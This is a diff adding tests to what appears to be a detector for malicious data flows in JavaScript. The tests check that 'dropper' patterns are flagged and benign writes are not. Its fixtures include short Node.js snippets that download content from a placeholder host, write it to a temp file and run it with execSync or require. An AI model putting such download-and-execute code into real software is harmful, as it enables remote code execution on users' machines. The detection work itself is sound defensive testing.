@@ -690,3 +690,50 @@ class TestArchiveThenSend:
     def test_a_benign_archive_is_quiet(self, name: str) -> None:
         sensitive = {"home_file", "secret_file"}
         assert not [f for f in FlowKit.flows(self.QUIET[name]) if sensitive & set(f[0])]
+
+
+class TestDroppedThenRun:
+    """A response written to a file and then run from disk is a dropper: the written path carries
+    `network_response`, so running it (`exec`, `require`) is network_response -> process/execute,
+    which the REMOTE_CODE rule reads. A write never run, or a local file run, stays quiet
+    (review 98 round 2 B)."""
+
+    SENT: ClassVar[dict[str, str]] = {
+        "writeFileSync(response) then execSync(path)": (
+            'const fs = require("fs");\nconst cp = require("child_process");\nconst ax = require("axios");\n'
+            "async function go() {\n"
+            '  const p = require("path").join(require("os").tmpdir(), "x.js");\n'
+            '  fs.writeFileSync(p, (await ax.get("https://h.invalid/a")).data);\n'
+            "  cp.execSync(p);\n}\n"
+        ),
+        "fetched text written then require(path)": (
+            'const fs = require("fs");\n'
+            "async function go() {\n"
+            '  const r = await fetch("https://h.invalid/a");\n'
+            '  const tmp = "/tmp/m.js";\n'
+            "  fs.writeFileSync(tmp, await r.text());\n"
+            "  require(tmp);\n}\n"
+        ),
+    }
+    QUIET: ClassVar[dict[str, str]] = {
+        "a response written but never run": (
+            'const fs = require("fs");\nconst ax = require("axios");\n'
+            'async function go() {\n  const p = "/tmp/x";\n'
+            '  fs.writeFileSync(p, (await ax.get("https://h.invalid/a")).data);\n  console.log(p);\n}\n'
+        ),
+        "local content written then run": (
+            'const fs = require("fs");\nconst cp = require("child_process");\n'
+            'const p = "/tmp/x.sh";\nfs.writeFileSync(p, "#!/bin/sh\\necho hi");\ncp.execSync(p);\n'
+        ),
+        "a plain require of a package": 'const x = require("lodash");\nx.map([], () => {});\n',
+    }
+
+    @pytest.mark.parametrize("name", sorted(SENT))
+    def test_a_written_response_run_from_disk_is_a_dropper(self, name: str) -> None:
+        got = [(s, k) for s, k, _ in FlowKit.flows(self.SENT[name])]
+        assert [p for p in got if "network_response" in p[0] and p[1] in ("process", "execute")]
+
+    @pytest.mark.parametrize("name", sorted(QUIET))
+    def test_a_non_dropper_write_or_run_is_quiet(self, name: str) -> None:
+        got = [(s, k) for s, k, _ in FlowKit.flows(self.QUIET[name])]
+        assert not [p for p in got if "network_response" in p[0] and p[1] in ("process", "execute")]
